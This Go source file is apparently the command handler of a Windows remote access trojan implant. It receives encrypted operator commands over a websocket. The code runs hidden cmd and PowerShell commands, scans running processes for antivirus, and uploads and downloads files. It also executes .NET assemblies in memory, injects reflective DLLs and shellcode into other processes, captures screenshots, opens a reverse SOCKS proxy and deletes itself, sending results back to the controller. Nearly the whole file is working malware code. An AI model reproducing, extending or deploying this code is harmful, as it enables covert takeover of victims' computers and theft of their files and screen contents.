package HandlePacket

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"runtime"
	"syscall"

	Encrypt "main/Encrypt/Windows"
	"main/Helper"
	"main/Helper/Proxy/operate"
	"main/Helper/loader"
	"main/MessagePack"
	PcInfo "main/PcInfo/Windows"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/shirou/gopsutil/process"
	"github.com/togettoyou/wsc"
)

var ProcessPath string
var FilePath string

func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
func SessionLog(log string, Connection *wsc.Wsc, unmsgpack MessagePack.MsgPack) {
	result := ""
	result = string(log)
	utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
	if err != nil {
		//Log(err.Error(), Connection, *unmsgpack)
		utf8Stdout = err.Error()
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Domain").SetAsString("")
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
	SendData(msgpack.Encode2Bytes(), Connection)

}

func Read(Data []byte, Connection *wsc.Wsc) {
	unmsgpack := new(MessagePack.MsgPack)
	deData, err := Encrypt.Decrypt(Data)
	if err != nil {
		return
	}

	unmsgpack.DecodeFromBytes(deData)
	//fmt.Print(string(deData))
	switch unmsgpack.ForcePathObject("Pac_ket").GetAsString() {

	case "OSshell":
		go func() {
			cmd := exec.Command("cmd", "/c", unmsgpack.ForcePathObject("Command").GetAsString())
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			var stdout, stderr bytes.Buffer
			cmd.Stdout = &stdout
			cmd.Stderr = &stderr

			err := cmd.Run()
			result := stdout.String()
			if err != nil {
				if result == "" {
					result = stderr.String()
				}
			}

			SessionLog(result, Connection, *unmsgpack)
		}()
	case "OSpowershell":
		{
			go func() {
				powershell := exec.Command("powershell", "-Command", unmsgpack.ForcePathObject("Command").GetAsString())
				powershell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				var stdout, stderr bytes.Buffer
				powershell.Stdout = &stdout
				powershell.Stderr = &stderr

				err := powershell.Run()
				result := stdout.String()
				if err != nil {
					if result == "" {
						result = stderr.String()
					}
				}
				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
				if err != nil {
					utf8Stdout = err.Error()
				}

				SessionLog(utf8Stdout, Connection, *unmsgpack)
			}()
		}

	case "getDrivers":
		{
			getDrivers(Connection, unmsgpack.ForcePathObject("HWID").GetAsString())
		}

	case "GetCurrentPath":
		{
			GetCurrentPath(Connection, *unmsgpack)
		}

	case "CheckAV":
		{
			processList, err := process.Processes()
			if err != nil {
				fmt.Printf("Error fetching processes: %s\n", err)
				return
			}

			var stringBuilder strings.Builder
			for _, proc := range processList {
				name, err := proc.Name()
				if err != nil {
					continue
				}
				stringBuilder.WriteString(name + "-=>")
			}
			fmt.Println(stringBuilder.String())
			result := ""
			result = string(stringBuilder.String())
			utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
			if err != nil {
				//Log(err.Error(), Connection, *unmsgpack)
				utf8Stdout = err.Error()
			}
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Domain").SetAsString("CheckAVInfo")
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
			msgpack.ForcePathObject("ProcessInfo").SetAsString(utf8Stdout)
			SendData(msgpack.Encode2Bytes(), Connection)
		}
	case "getPath":
		{

			switch unmsgpack.ForcePathObject("PathType").GetAsString() {

			case "RootPath":
				{
					wd, err := os.Getwd()
					if err != nil {
						SessionLog(err.Error(), Connection, *unmsgpack)
						return
					}

					// 获取卷名
					volName := filepath.VolumeName(wd)
					if volName == "" {
						//fmt.Println("Root directory:", "/")
						FilePath = "/"
					} else {
						FilePath = volName + "//"
					}
				}
			default:
				{
					FilePath = unmsgpack.ForcePathObject("Path").GetAsString()
				}
			}

			RefreshDir(Connection, *unmsgpack)
		}
	case "renameFile":
		{
			RenameFile(unmsgpack.ForcePathObject("OldName").GetAsString(), unmsgpack.ForcePathObject("NewName").GetAsString())
		}

	case "execute":
		{ //Args := unmsgpack.ForcePathObject("Args").GetAsString()
			cmd := exec.Command(unmsgpack.ForcePathObject("ExecFilePath").GetAsString())
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			cmd.Start()
		}

	case "process":
		{
			ProcessInfo(Connection, *unmsgpack)
		}

	case "processKill":
		{
			PID := unmsgpack.ForcePathObject("PID").GetAsString()
			pid, err := strconv.Atoi(PID)

			killProcess(pid)
			if err != nil {
				SessionLog(err.Error(), Connection, *unmsgpack)
			} else {
				SessionLog("Process %d killed.\n", Connection, *unmsgpack)
			}
			ProcessInfo(Connection, *unmsgpack)
		}

	case "FileRead":
		{
			FileRead(Connection, *unmsgpack)
		}

	case "deleteFile":
		{
			DeleteFile(Connection, *unmsgpack)
		}

	case "cutFile":
		{
			CutFile(strings.ReplaceAll(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), "\\", "/"), strings.ReplaceAll(unmsgpack.ForcePathObject("PasteFilePath").GetAsString(), "\\", "/"))
			RefreshDir(Connection, *unmsgpack)
		}

	case "pasteFile":
		{
			PasteFile(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), unmsgpack.ForcePathObject("PasteFilePath").GetAsString())

			RefreshDir(Connection, *unmsgpack)
		}

	case "UploadFile":
		{
			fullPath := filepath.Join(unmsgpack.ForcePathObject("UploaFilePath").GetAsString(), unmsgpack.ForcePathObject("Name").GetAsString())

			// 将所有的反斜杠替换为斜杠
			normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "\\")
			err := ioutil.WriteFile(normalizedPathStr, unmsgpack.ForcePathObject("FileBin").GetAsBytes(), 0644)
			if err != nil {
				SessionLog("File writing failed! , please elevate privileges", Connection, *unmsgpack)
			}
			RefreshDir(Connection, *unmsgpack)
		}

	case "downloadFile":
		{
			FilePath := unmsgpack.ForcePathObject("FilePath").GetAsString()
			// 将所有的反斜杠替换为斜杠
			normalizedPathStr := strings.ReplaceAll(FilePath, "\\", "/")
			//println(normalizedPathStr)
			// 读取文件到字节数组
			data, err := ioutil.ReadFile(normalizedPathStr)
			if err != nil {

				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileError")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("Message").SetAsString(err.Error())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				SendData(msgpack.Encode2Bytes(), Connection)

			} else {
				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileDownload")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
				msgpack.ForcePathObject(("Data")).SetAsBytes(data)
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
				//Log(PcInfo.GetHWID()+":download successful", Connection, *unmsgpack)
				SendData(msgpack.Encode2Bytes(), Connection)
			}
		}

	case "NewFolder":
		err := os.MkdirAll(unmsgpack.ForcePathObject("NewFolderName").GetAsString(), 0755)
		if err != nil {
			fmt.Printf("Error creating directory: %v\n", err)
		}

	case "NewFile":
		file, err := os.Create(unmsgpack.ForcePathObject("NewFileName").GetAsString())
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		defer file.Close()

		//fmt.Println("File created successfully!")

		result, err := listDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
		if err != nil {
			SessionLog(err.Error(), Connection, *unmsgpack)
			return
		}
		//fmt.Println("calc")
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("FileDir").GetAsString())
		msgpack.ForcePathObject("File").SetAsString(result)
		SendData(msgpack.Encode2Bytes(), Connection)

	case "ZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			err := Zip(filename, filename+".zip")
			if err != nil {
				SessionLog(err.Error(), Connection, *unmsgpack)
			}
		}
	case "UNZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			if !strings.HasSuffix(filename, ".zip") {
				SessionLog("FileName does not end with .zip", Connection, *unmsgpack)
				return
			}
			err := Unzip(filename, strings.ReplaceAll(filename, ".zip", ""))
			if err != nil {
				SessionLog((err.Error()), Connection, *unmsgpack)
			}

		}

	// case "ProcessMove":
	// 	sc := unmsgpack.ForcePathObject("Bin").GetAsBytes()
	// 	pid, _ := strconv.Atoi(unmsgpack.ForcePathObject("PID").GetAsString())
	// 	ShellcodeInjector(sc, pid)

	case "NetWork":
		{
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("NetWorkInfo")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("NetWorkInfoList").SetAsString(Network())
			SendData(msgpack.Encode2Bytes(), Connection)

		}

	case "NoteAdd":
		{
			PcInfo.RemarkContext = unmsgpack.ForcePathObject("RemarkContext").GetAsString()
			PcInfo.RemarkColor = unmsgpack.ForcePathObject("RemarkColor").GetAsString()
		}
	case "Group":
		{
			PcInfo.GroupInfo = unmsgpack.ForcePathObject("GroupInfo").GetAsString()
		}

	case "option":
		{
			switch unmsgpack.ForcePathObject("Command").GetAsString() {
			case "Disconnnect":
				{
					os.Exit(0)
				}
			}
		}

	case "ClientUnstaller":
		{
			exe, err := os.Executable()
			if err != nil {
				panic(err)
			}
			//fmt.Println(exe)
			os.Remove(exe)
			os.Exit(0)
		}
	case "ClientReboot":
		{
			exe, err := os.Executable()
			if err != nil {

			}
			cmd := exec.Command(exe)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Start()

			os.Exit(0)

		}

	case "shell":
		{
			go func() {
				cmd := exec.Command("cmd")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				result := ""
				output, err := cmd.Output()
				if err != nil {
					//Log(err.Error(), Connection, *unmsgpack)
					result = err.Error()
				}
				result = string(output)
				dir, err := os.Getwd()
				if err != nil {
					//fmt.Println("Error:", err)
					return
				}
				ProcessPath = dir
				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
				if err != nil {
					//Log(err.Error(), Connection, *unmsgpack)
					utf8Stdout = err.Error()
				}
				msgpack := new(MessagePack.MsgPack)

				msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout + "\n")
				SendData(msgpack.Encode2Bytes(), Connection)
			}()

		}
	case "shellWriteInput":
		{
			go func() {
				cmdString := unmsgpack.ForcePathObject("WriteInput").GetAsString() // 命令字符串

				executeCommandAndHandleCD(cmdString)

				cmd := exec.Command("cmd", "/c", "cd "+ProcessPath+"&&"+cmdString)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				var stdout, stderr bytes.Buffer
				cmd.Stdout = &stdout
				cmd.Stderr = &stderr

				err := cmd.Run()
				result := stdout.String()

				if err != nil {
					//log.Printf("Command execution error: %v, error output: %s\n", err, stderr.String())
					if result == "" { // If there is no standard output, use error output
						result = stderr.String()
					}
				}

				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
				if err != nil {
					//Log(err.Error(), Connection, *unmsgpack)
					utf8Stdout = err.Error()
				}
				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				msgpack.ForcePathObject("ReadInput").SetAsString(ProcessPath + "\\>" + unmsgpack.ForcePathObject("WriteInput").GetAsString() + "\n" + utf8Stdout)
				SendData(msgpack.Encode2Bytes(), Connection)
			}()
		}
	case "RunPS":
		{
			args := unmsgpack.ForcePathObject("args").GetAsString()
			//fmt.Println(strings.ReplaceAll(args, unmsgpack.ForcePathObject("HWID").GetAsString(), ""))
			go func() {
				Assembly(Nps_4, Connection, args, unmsgpack)
			}()
		}
	case "inline-assembly":
		{
			data := unmsgpack.ForcePathObject("Bin").GetAsBytes()
			args := unmsgpack.ForcePathObject("args").GetAsString()
			go func() {
				InlineAssembly(data, Connection, args, unmsgpack)
			}()
		}
	case "execute-assembly":
		{
			data := unmsgpack.ForcePathObject("Bin").GetAsBytes()
			args := unmsgpack.ForcePathObject("args").GetAsString()
			//fmt.Println(args)
			go func() {

				Assembly(data, Connection, args, unmsgpack)

			}()
		}
	case "spwanBin":
		{
			go func() {
				var prog string
				if runtime.GOARCH == "amd64" {
					prog = unmsgpack.ForcePathObject("Process64").GetAsString()
				} else {
					prog = unmsgpack.ForcePathObject("Process86").GetAsString()
				}
				//fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
				RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, "-w "+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
			}()
		}
	case "inline-bin":
		{
			go func() {
				injectReflectiveDLL(unmsgpack.ForcePathObject("Controler_HWID").GetAsString(), unmsgpack.ForcePathObject("Bin").GetAsBytes(), Connection)
			}()

		}

	case "ReverseProxy":
		{
			RemoteIp := unmsgpack.ForcePathObject("remoteIp").GetAsString()
			connectPort := unmsgpack.ForcePathObject("connectPort").GetAsString()
			go func() {
				operate.ProxyRemote(RemoteIp+":"+connectPort, false)
			}()
			fmt.Println(unmsgpack.ForcePathObject("HPID").GetAsString())
			msgpack := new(MessagePack.MsgPack)

			msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")

			info := PcInfo.GetCurrentUser() + "-=>" +
				PcInfo.GetClientComputer() + "-=>" +
				PcInfo.GetProcessID() + "-=>" +
				"TCP/Socks5" + "-=>" +
				RemoteIp + "-=>" +
				connectPort + "-=>" +
				unmsgpack.ForcePathObject("HPID").GetAsString() + "-=>" +
				unmsgpack.ForcePathObject("SocksPort").GetAsString() + "-=>"

			msgpack.ForcePathObject("Info").SetAsString(info)
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			SendData(msgpack.Encode2Bytes(), Connection)
		}

	case "Migration":
		{
			Data := unmsgpack.ForcePathObject("Bin").GetAsBytes()

			PID, err := strconv.Atoi(unmsgpack.ForcePathObject("PID").GetAsString())
			//fmt.Println(PID)
			if err != nil {
				fmt.Println(err)
			}
			loader.RunCreateRemoteThread(Data, PID)
		}
	case "Screenshot":
		{
			data := Screenshot()
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("Screenshot")
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("Stream").SetAsBytes(data)
			SendData(msgpack.Encode2Bytes(), Connection)
		}
	}
}
